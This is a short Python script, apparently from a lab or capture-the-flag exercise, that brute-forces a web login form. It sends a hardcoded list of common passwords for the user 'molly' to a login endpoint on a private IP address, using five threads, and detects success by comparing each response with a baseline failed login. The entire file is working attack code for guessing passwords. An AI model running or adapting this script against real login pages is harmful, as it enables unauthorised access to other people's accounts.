import requests
from concurrent.futures import ThreadPoolExecutor

url = "http://10.10.12.70/login"
username = "molly"
passwords = ["1234", "admin", "password", "0000", "pass123", "sunshine","hello","hi", "love143", "10001", "pass123"]

# Baseline failed response
baseline = requests.post(url, data={"username": username, "password": "wrongpass"}).text

# Function to check one password
def try_password(password):
    data = {"username": username, "password": password}
    response = requests.post(url, data=data)
    if response.text != baseline:
        print(f"[+] Password found: {password}")
        return True  # Success
    else:
        print(f"[-] Tried: {password}")
        return False  # Fail

# Run brute-force with threads
with ThreadPoolExecutor(max_workers=5) as executor:
    futures = {executor.submit(try_password, pw): pw for pw in passwords}
    for future in futures:
        if future.result():
            break  # Stop once password is found
